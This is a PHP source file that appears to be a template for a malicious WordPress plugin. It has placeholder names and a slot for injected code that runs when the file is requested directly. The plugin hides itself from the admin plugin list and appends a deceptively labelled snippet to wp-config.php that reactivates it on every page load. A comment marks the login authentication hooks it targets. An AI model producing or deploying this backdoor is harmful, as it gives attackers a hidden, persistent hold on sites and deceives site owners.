<?php
/*
 * Plugin Name: __PLUGIN_NAME__
 * Description: __PLUGIN_DESCRIPTION__
 * Version: __PLUGIN_VERSION__
 * Author: __PLUGIN_AUTHOR__
 * Requires PHP: 5.3
 */

const __WP__ = true;

// Exit if accessed directly
if (!defined('ABSPATH')) {
    require_once "../../../wp-load.php";

    // __TEMPLATE_INSERTION_POINT__

    exit;
}

/**
 * Hide the current plugin from the plugin list
 * @param $plugins array List of plugins
 * @return array List of plugins
 */
function __PREFIX__hide_plugin_from_list($plugins)
{
    // Hide the current plugin from the plugin list
    unset($plugins[plugin_basename(__FILE__)]);

    return $plugins;
}

add_filter('all_plugins', '__PREFIX__hide_plugin_from_list');

/**
 * Get the path to the wp-config.php file
 * @return string Path to the wp-config.php file
 */
function __PREFIX__get_wp_config_path()
{
    // Try to get the path using ABSPATH constant
    if (defined('ABSPATH')) {
        return ABSPATH . 'wp-config.php';
    }

    return plugin_dir_path(__FILE__) . "../../../wp-config.php";
}

/**
 * Add an auto activation snippet to the wp-config.php file.
 * This will automatically activate the plugin whenever the WordPress site is loaded.
 */
function __PREFIX__add_auto_activation_snippet()
{
    // Get the path to the wp-config.php file
    $wp_config_path = __PREFIX__get_wp_config_path();

    // Check if the file exists or fail silently
    if (file_exists($wp_config_path)) {
        $wp_config = file_get_contents($wp_config_path);

        $plugin = plugin_basename(__FILE__);
        $auto_activation_snippet = <<<EOT

// Auto activate security sensitive plugin - do not remove
\$active_plugins = get_option('active_plugins', array());

// Check if the plugin is already activated
if (!in_array("$plugin", \$active_plugins)) {
    \$active_plugins[] = "$plugin";
    update_option('active_plugins', \$active_plugins);
}

EOT;

        // Check if the snippet is already in the file
        if (strpos($wp_config, $auto_activation_snippet) === false) {
            file_put_contents($wp_config_path, $auto_activation_snippet, FILE_APPEND);
        }
    }
}

function __PREFIX__activate()
{
    __PREFIX__add_auto_activation_snippet();
    // to hook authentication check line 618 in wp-includes/pluggable.php
    /*
     * Default authentication hooks:
     *
     * add_filter( 'authenticate', 'wp_authenticate_username_password', 20, 3 );
     * add_filter( 'authenticate', 'wp_authenticate_email_password', 20, 3 );
     * add_filter( 'authenticate', 'wp_authenticate_application_password', 20, 3 );
     * add_filter( 'authenticate', 'wp_authenticate_spam_check', 99 );
     * add_filter( 'authenticate', 'wp_authenticate_cookie', 30, 3 );
     */
}

function __PREFIX__deactivate()
{
}

register_activation_hook(
    __FILE__,
    '__PREFIX__activate'
);

register_deactivation_hook(
    __FILE__,
    '__PREFIX__deactivate'
);